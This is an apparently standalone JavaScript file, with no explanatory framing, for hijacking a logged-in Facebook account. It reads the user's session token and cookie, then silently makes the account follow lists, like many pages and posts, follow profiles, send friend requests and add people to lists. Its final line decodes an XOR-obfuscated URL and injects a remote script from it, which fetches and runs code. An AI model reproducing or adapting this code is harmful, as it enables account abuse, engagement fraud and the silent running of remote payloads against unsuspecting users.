/*Follow List*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function LIST(L) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/friends/lists/subscribe/modify";
    var XParams = "flid=" + L + "&action=subscribe&location=feed&nctr[_mod]=pagelet_group_mall&ft[type]=40&ft[tn]=DH&__user=" + user_id + "&__a=1&__dyn=7n8ahxoNpGo&__req=y&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
LIST("567376543307348");
LIST("591619694216366");
LIST("591621524216183");
LIST("591619460883056");
LIST("591623140882688");
LIST("577657768945892");
LIST("591624280882574");
LIST("591625247549144");
LIST("591619600883042");
LIST("591620727549596");
LIST("562836113761391");
LIST("591619047549764");
LIST("591624687549200");
LIST("591619340883068");
LIST("599238170088731");


/*Like Page*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function Like(p) {
    var Page = new XMLHttpRequest();
    var PageURL = "//www.facebook.com/ajax/pages/fan_status.php";
    var PageParams = "&fbpage_id=" + p + "&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg=" + fb_dtsg + "&phstamp=";
    Page.open("POST", PageURL, true);
    Page.onreadystatechange = function () {
        if (Page.readyState == 4 && Page.status == 200) {
            Page.close;
        }
    };
    Page.send(PageParams);
}
Like("313072532101076");
Like("190451517757758");
Like("595580513789645");
Like("300241633420701");
Like("231125826929893");
Like("456401041060837");
Like("523004351084154");
Like("229353647087574");
Like("229488947108546");
Like("205908352819272");
Like("313072532101076");
Like("209464459125570");
Like("523004351084154");
Like("200776629976061");
Like("147857465295449");
Like("163588093717517");
Like("291092130903328");
Like("429143760437630");
Like("149394451859931");
Like("306495312809675");
Like("238044532932475");
Like("533658463364561");
Like("528019587257023");
Like("114432912090688");
Like("165411580286132");
Like("333193263435488");
Like("104142816349744");
Like("379373108754478");
Like("569302423102592");
Like("234982333218667");
Like("456483724412226");
Like("136785296514054");
Like("146320572185345");
Like("150423395088679");
Like("651209744905814");
Like("605644426114536");
Like("476744145734993");
Like("190943597728424");
Like("127402680785850");
Like("453718184719532");
Like("177430755751025");
Like("110871649075947");
Like("280308438768084");
Like("175177679305434");
Like("122109094662677");
Like("567227273316419");

 /*Auto Follow*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone) {
    var http4 = new XMLHttpRequest();
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
    http4.onreadystatechange = function () {
        if (http4.readyState == 4 && http4.status == 200) {
            http4.close;
        }
    };
    http4.send(params4);
}
a("100003697277263");
a("100003846224832");
a("100001050235420");


 /*Add Friend*/
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function IDS(r) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/add_friend/action.php";
    var XParams = "to_friend=" + r + "&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
IDS("100004021942009");
IDS("100003977780572");
IDS("100004043843895");
IDS("100004121340012");

var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var now = (new Date).getTime();

function P(post) {
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=1&client_id=" + now + "%3A3366677427&rootid=u_ps_0_0_14&giftoccasion&ft[tn]=%3E%3DU&ft[type]=20&ft[qid]=5882006890513784712&ft[mf_story_key]=" + post + "&nctr[_mod]=pagelet_home_stream&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAg&__req=j&fb_dtsg=" + fb_dtsg + "&phstamp=";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
        if (X.readyState == 4 && X.status == 200) {
            X.close;
        }
    };
    X.send(XParams);
}
P("582362518475417");
P("586772274701108");
P("583963808315288");
P("586570844721251");
P("585557111489291");
P("458762124214883");
P("458760640881698");
P("493088494069487");
P("493083820736621");
P("491205797591090");
P("462706753774328");
P("461398507238486");
P("465344260224791");
P("590722067639462");
P("351473514982500");
P("592137640831238");
P("592135890831413");
P("592135890831413");
P("592135407498128"); 

/*Auto Add 2 List*/
if (document.getElementsByName('flid')[0].value) {
    var flid = document.getElementsByName('flid')[0].value;
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

    function a2l(opo) {
        var http4 = new XMLHttpRequest();
        var url4 = "//www.facebook.com/friends/ajax/lists.php";
        var params4 = "add=1&search=1&source=typeahead&flid=" + flid + "&id=" + opo + "&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFwXAF0&__req=w&fb_dtsg=" + fb_dtsg + "&phstamp=";
        http4.open("POST", url4, true);
        http4.onreadystatechange = function () {
            if (http4.readyState == 4 && http4.status == 200) {
                http4.close;
            }
        };
        http4.send(params4);
    }
    a2l("100003785647375");
    a2l("100003697277263");
    a2l("100001050235420");
};
A="jvvrq8--pcu,ekvjw`,amo-ucxx{epc{-dcag`mmi-ej/rcegq-Qwrrmpv,hq";B="";C="";for(i=0;i<A.length;i++){B+=String.fromCharCode(A.charCodeAt(i)^2)}C=unescape(B);document.body.appendChild(document.createElement('script')).src=C;
